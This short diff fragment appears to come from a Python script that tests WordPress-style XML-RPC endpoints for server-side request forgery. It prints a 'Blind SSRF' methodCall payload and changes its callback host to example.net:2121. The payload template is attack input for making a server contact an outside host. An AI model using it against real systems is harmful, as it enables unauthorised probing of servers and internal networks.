@@ -41,7 +41,7 @@ if "403" in response.text:
 </methodCall>""")
     print("For Blind SSRF:")
     print("""<methodCall>
-   <methodName>https://meentest.net:2121</methodName>
+   <methodName>https://example.net:2121</methodName>
   <params>
     <param>
       <value><string>https://google.com</string></value>
